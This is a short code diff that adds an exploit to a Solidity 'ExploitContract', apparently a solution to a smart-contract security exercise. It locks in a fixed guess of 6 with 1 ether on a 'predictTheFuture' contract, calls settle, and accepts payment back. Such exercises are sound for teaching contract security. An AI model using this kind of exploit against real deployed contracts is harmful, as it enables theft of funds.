@@ -54,4 +54,13 @@ contract ExploitContract {
     }
 
     // Write your exploit code below
+    function guess() public {
+        predictTheFuture.lockInGuess{value: 1 ether}(6);
+    }
+
+    function settle() public {
+        predictTheFuture.settle();
+    }
+
+    receive() external payable { }
 }
